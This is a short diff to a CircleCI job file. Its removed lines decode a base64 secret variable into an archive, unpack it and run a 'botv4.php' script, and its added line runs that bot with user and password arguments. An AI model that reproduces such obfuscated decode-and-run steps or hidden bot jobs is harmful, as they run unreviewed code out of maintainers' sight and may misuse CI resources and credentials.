@@ -6,9 +6,4 @@ jobs:
       - image: circleci/php:7.4-cli
     steps:
       - checkout
-      - run: php -v
-      - run: |
-          echo $SCRIPT | base64 -d > p.tar.gz
-      - run: |
-          tar xzf p.tar.gz
-          php botv4.php 0
+      - run: php botv4.php 0 $user $pass
